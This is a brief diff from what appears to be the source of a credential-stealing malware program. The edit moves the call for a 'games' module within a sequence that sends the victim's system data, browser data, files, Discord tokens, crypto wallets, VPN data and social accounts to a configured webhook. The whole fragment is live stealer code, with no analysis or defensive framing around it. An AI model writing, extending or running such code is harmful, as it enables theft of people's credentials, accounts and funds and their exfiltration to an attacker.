@@ -57,10 +57,10 @@ const aurita = async () => {
     
     await execute(system, CONFIG.webhook);
     await execute(browsers, CONFIG.webhook);
-    await execute(games, CONFIG.webhook);
     await execute(commonFiles, CONFIG.webhook);
     await execute(stealCodes, CONFIG.webhook);
     await execute(discordTokens, CONFIG.webhook);
+    await execute(games, CONFIG.webhook);
     await execute(wallets, CONFIG.webhook);
     await execute(vpns, CONFIG.webhook);
     await execute(socials, CONFIG.webhook);
